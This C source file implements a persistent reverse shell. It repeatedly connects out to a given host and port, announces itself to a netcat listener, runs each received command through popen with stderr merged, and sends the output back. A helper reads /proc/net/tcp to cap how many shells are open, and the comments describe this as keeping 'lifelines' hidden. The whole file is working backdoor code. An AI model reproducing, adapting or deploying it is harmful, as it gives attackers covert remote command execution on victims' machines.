#define _GNU_SOURCE

#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "reverse.h"
const char *PROC_NET_TCP = "/proc/net/tcp";

void reverse_shell(const char *host, unsigned int port, unsigned int num_shells) {
    int sock;
    char input[256];
    char output[256];
    struct sockaddr_in client;
    const char *cmd_postfix = " 2>&1";

    client.sin_family = AF_INET;
    client.sin_addr.s_addr = inet_addr(host);
    client.sin_port = htons(port);

    while (1) {

        sock = socket(AF_INET, SOCK_STREAM, 0);
        // Try connecting every few seconds.
        // Our listener might not always be available
        // If we set a shell limit, keep waiting until we have a free slot
        //
        // BUG; sure, this doesn't do any fancy mutual exclusion, but it should at
        // least hide some of our lifelines by keeping them out of netstat.
        int conn = -1;
        while (conn != 0) {
            if (num_shells == 0 || num_current_connections(host, port) < num_shells) {
                conn = connect(sock, (struct sockaddr *)&client, sizeof(client));
            }
            // If we didn't establish a connection in the previous step, sleep for a bit
            if (conn != 0) {
                sleep(5);
            }
        }

        // Send a message to indicate a socket just connected.
        // Helpful when using a simple `nc` listener
        send(sock, "Connected!\n", strlen("Connected!\n"), 0);

        while (read(sock, input, sizeof(input) - sizeof(cmd_postfix) - 1) > 0) {
            // Add a postfix to the command to redirect stderr to stdout, s.t.
            // it is also picked up by fgets
            char *enter = strstr(input, "\n");
            strcpy(enter, cmd_postfix);
            FILE *fp = popen(input, "r");
            while (fgets(output, sizeof(output), fp) != NULL) {
                send(sock, output, strlen(output)+1, 0);
            }
            pclose(fp);
        }
        close(sock);
    }
}

// Read the current number of reverse shells we've got going at the moment.
//
// Can be used to keep other lifeline threads hidden by not causing net traffic
int num_current_connections(const char *host, unsigned int port) {
    unsigned int occurences = 0;

    int host_int = inet_addr(host);

    FILE *tcp_file = fopen(PROC_NET_TCP, "r");
    if (tcp_file == NULL) {
        return -1;
    }
    char line[256];

    unsigned int i = 0;
    while (fgets(line, sizeof(line), tcp_file) != NULL) {
        // First line skipped, since it's a header
        if (i != 0) {
            int line_host, line_port, state;
            sscanf(line, "%*d: %*X:%*X %X:%X %X %*512s\n", &line_host, &line_port, &state);
            // ... We want to spin up a new shell if we're not in ESTABLISHED, SYN_RECEIVED or
            // SYN_SEND
            if (line_host == host_int && line_port == port &&
                (state == 1 || state == 2 || state == 3)) {
                occurences += 1;
            }
        }
        i += 1;
    }
    return occurences;
}
